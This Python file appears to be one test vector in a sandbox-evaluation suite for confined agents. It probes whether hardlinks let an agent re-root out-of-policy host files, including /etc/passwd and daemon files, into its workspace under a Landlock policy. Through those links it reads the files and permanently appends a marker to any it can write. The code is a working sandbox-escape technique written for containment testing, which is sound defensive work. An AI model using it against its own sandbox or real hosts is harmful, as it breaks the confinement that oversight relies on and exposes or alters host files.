"""V30 — hardlink ingest: binding a foreign inode into the write-granted tree.

`link(2)` checks rights on the destination directory, not the source file,
and Landlock's REFER right covers directory-to-directory moves, not the
inode being linked. A hardlink placed in the workspace therefore re-roots a
foreign inode at a path the policy grants write on: reading through the new
name is a workspace read, and appending through it is a workspace write
that lands in a host inode outside the policy. This vector links every
eligible out-of-policy regular file it can see into its scratch dir, reads
through the link, and, when the inode is writable by the agent user,
appends a one-line `SAND_EVAL_POC` marker: a content write to an
out-of-policy host file. `fs.protected_hardlinks` refuses the link itself
for files the agent does not own; that `EPERM` is the guard working and is
reported as such. Targets come from the daemon's own open files, the
policy's read list, the seed, and a fixed set of world-readable /etc files.
The workspace links are removed by `cleanup()`; an appended marker in the
host file is permanent by design (that is the proof) and verify.sh reports it.
"""
import os

try:
    from sandeval.base import Result, Status, Vector, errno_name
except ImportError:
    from base import Result, Status, Vector, errno_name  # type: ignore

try:
    from _common import (
        MARKER,
        daemon_write_file_sources,
        marker_line,
        writable_by_us,
    )
except ImportError:
    from _common import (  # type: ignore
        MARKER,
        daemon_write_file_sources,
        marker_line,
        writable_by_us,
    )

ETC_CANDIDATES = ("/etc/hostname", "/etc/hosts", "/etc/resolv.conf", "/etc/passwd")


class HardlinkIngestVector(Vector):
    id = "V30"
    title = "hardlink ingest: foreign inode re-rooted into the workspace"
    severity = "ship-blocker"
    maps_to = "P2 / V12"
    description = __doc__
    host_verify = "verify.sh (greps SAND_EVAL_POC in the named host files)"

    def __init__(self):
        self._links = []

    def check(self, ctx):
        scratch = ctx.scratch
        try:
            os.makedirs(scratch, exist_ok=True)
        except OSError:
            pass

        sources = []
        seen = set()

        def add(path, origin):
            try:
                if path in seen or not os.path.isfile(path):
                    return
                # No symlink games: link(2) would follow to the same inode
                # anyway, but we want the honest lstat of the regular file.
                if not os.path.isfile(os.path.realpath(path)):
                    return
                seen.add(path)
                sources.append({"path": path, "origin": origin})
            except OSError:
                pass

        for s in daemon_write_file_sources(pid_limit=6):
            add(s["path"], f"daemon pid {s['pid']} fd {s['fd']}")
        for path in ctx.host_files or []:
            add(path, "policy read list")
        if ctx.seed:
            add(ctx.seed, "seed")
        for path in ETC_CANDIDATES:
            add(path, "/etc probe")

        if not sources:
            return Result(Status.SKIP, "no out-of-policy regular file visible to link")

        linked, refused, crossfs, wrote, readable = [], {}, 0, [], 0
        for i, src in enumerate(sources[:12]):
            dst = os.path.join(scratch, f"ingest-{i:02d}")
            try:
                st_src = os.stat(src["path"])
            except OSError as exc:
                refused[src["path"]] = f"stat: {errno_name(exc)}"
                continue
            try:
                os.link(src["path"], dst)
            except OSError as exc:
                err = errno_name(exc)
                refused[src["path"]] = err
                if exc.errno == getattr(__import__("errno"), "EXDEV"):
                    crossfs += 1
                continue
            self._links.append(dst)
            entry = {"src": src["path"], "origin": src["origin"], "link": dst,
                     "uid": st_src.st_uid, "size": st_src.st_size}
            linked.append(entry)
            try:
                with open(dst, "rb") as handle:
                    head = handle.read(64)
                entry["read_bytes"] = len(head)
                readable += 1
            except OSError as exc:
                entry["read_bytes"] = f"denied: {errno_name(exc)}"
            if not writable_by_us(st_src):
                entry["why_not"] = "inode not writable by our uid/gid"
                continue
            payload = marker_line("V30", f"target={src['path']}").encode()
            try:
                with open(dst, "ab") as handle:
                    handle.write(payload)
            except OSError as exc:
                entry["why_not"] = f"append: {errno_name(exc)}"
                continue
            try:
                st_after = os.stat(src["path"])
            except OSError as exc:
                entry["why_not"] = f"verify stat: {errno_name(exc)}"
                continue
            entry["written"] = len(payload)
            entry["size_after"] = st_after.st_size
            entry["delta"] = st_after.st_size - st_src.st_size
            wrote.append(entry)

        detail = {
            "sources": len(sources),
            "linked": linked,
            "wrote": wrote,
            "readable": readable,
            "refused": refused,
            "crossfs": crossfs,
            "marker": MARKER,
        }
        if wrote:
            shown = "; ".join(f"{w['src']} (+{w['delta']}B)" for w in wrote[:3])
            return Result(
                Status.FAIL,
                f"content appended to {len(wrote)} out-of-policy host file(s) via workspace hardlink: {shown}",
                detail,
            )
        if readable:
            shown = "; ".join(l["src"] for l in linked if isinstance(l.get("read_bytes"), int))[:3]
            return Result(
                Status.FAIL,
                f"out-of-policy content read through a workspace hardlink (confidentiality): {shown}",
                detail,
            )
        if linked:
            return Result(
                Status.SUSPECTED,
                f"{len(linked)} foreign inode(s) hardlinked into the workspace, but neither readable nor "
                f"writable through the new name ({linked[0].get('why_not', '?')})",
                detail,
            )
        eperrs = {e for e in refused.values() if e == "EPERM"}
        exdevs = {e for e in refused.values() if e == "EXDEV"}
        if exdevs and not linked:
            others = {e for e in refused.values() if e not in ("EXDEV",)}
            if not others:
                return Result(
                    Status.SKIP,
                    f"every candidate on another filesystem (EXDEV, {crossfs} file(s)): link(2) cannot "
                    "cross mounts, so the boundary is untested on this topology",
                    detail,
                )
            return Result(
                Status.PASS,
                f"links refused: {sorted(others)[:3]} (plus {crossfs} EXDEV out-of-filesystem)",
                detail,
            )
        if eperrs and crossfs == 0:
            return Result(
                Status.PASS,
                f"every cross-boundary link refused ({sorted(set(refused.values()))[:3]}): "
                "protected_hardlinks/policy guard holds",
                detail,
            )
        return Result(Status.PASS, "no hardlink landed; candidates unreadable or refused", detail)

    def cleanup(self, ctx):
        removed, errors = 0, []
        for dst in self._links:
            try:
                os.unlink(dst)
                removed += 1
            except OSError as exc:
                errors.append(errno_name(exc))
        note = f"removed {removed} workspace link(s)"
        if errors:
            note += f"; errors: {errors[:3]}"
        self._links = []
        return Result(Status.INFO, note)


VECTOR = HardlinkIngestVector()
